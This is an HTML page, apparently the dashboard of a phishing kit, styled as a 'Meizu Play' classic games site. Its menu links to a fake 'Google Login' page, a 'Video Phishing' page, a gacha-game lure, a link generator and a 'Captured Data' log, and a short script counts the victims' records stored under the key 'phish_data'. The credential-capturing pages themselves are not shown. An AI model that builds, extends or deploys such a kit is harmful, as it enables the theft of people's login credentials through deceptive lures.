<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Meizu Play</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
body{background:#f5f5f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{max-width:460px;width:100%;background:#fff;border-radius:40px;padding:30px 22px;border:1px solid rgba(0,0,0,0.03)}
.header{text-align:center;margin-bottom:22px}
.header .icon{font-size:48px;display:block}
.header h1{font-size:24px;font-weight:600;color:#1a1a1a}
.header p{font-size:14px;color:#999;margin-top:2px}
.game-sim{background:#f8f8f8;border-radius:24px;padding:24px 16px;margin:18px 0;border:1px solid #eee;text-align:center}
.game-sim .icon-game{font-size:56px;display:block}
.game-sim .title-game{font-size:16px;font-weight:600;color:#1a1a1a}
.game-sim .desc-game{font-size:13px;color:#999}
.game-sim .btn-game{margin-top:12px;background:#1a1a1a;color:#fff;border:none;padding:10px 28px;border-radius:40px;font-size:14px;opacity:0.6}
.menu-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px}
.menu-grid a{display:block;padding:14px;background:#f8f8f8;border:1px solid #eee;border-radius:16px;color:#1a1a1a;text-decoration:none;text-align:center;font-size:13px;font-weight:500}
.menu-grid a:hover{background:#f0f0f0}
.menu-grid a.danger{color:#cc0000;border-color:#ffdddd}
.menu-grid a.success{color:#006600;border-color:#ccf0cc}
.status-bar{margin-top:20px;padding:14px;background:#f8f8f8;border-radius:16px;font-size:13px;color:#666;text-align:center}
.status-bar strong{color:#1a1a1a}
.footer{text-align:center;margin-top:20px;color:#ccc;font-size:10px;letter-spacing:2px}
</style>
</head>
<body>
<div class="container">
<div class="header"><span class="icon">📱</span><h1>Meizu Play</h1><p>Classic games, modern style</p></div>
<div class="game-sim"><span class="icon-game">🎮</span><div class="title-game">Snake Classic</div><div class="desc-game">Tap to start playing</div><button class="btn-game">▶ Play Now</button></div>
<div style="font-size:11px;color:#ccc;text-align:center;letter-spacing:2px;margin-top:8px;">— MENU —</div>
<div class="menu-grid">
<a href="google.html">🔐 Google Login</a>
<a href="video.html">🎬 Video Phishing</a>
<a href="gacha.html">🎮 Gacha Game</a>
<a href="links.html" class="success">🔗 Generate Link</a>
<a href="logs.html" class="danger">📊 Captured Data</a>
</div>
<div class="status-bar"><strong>✅ SYSTEM ACTIVE</strong> • Total Captured: <span id="totalCaptured">0</span></div>
<div class="footer">// MEIZU WHITE EDITION //</div>
</div>
<script>
const STORAGE_KEY='phish_data';
function getLogs(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY))||[];}catch{return[];}}
function updateTotal(){const el=document.getElementById('totalCaptured');if(el)el.textContent=getLogs().length;}
document.addEventListener('DOMContentLoaded',updateTotal);
</script>
</body>
</html>
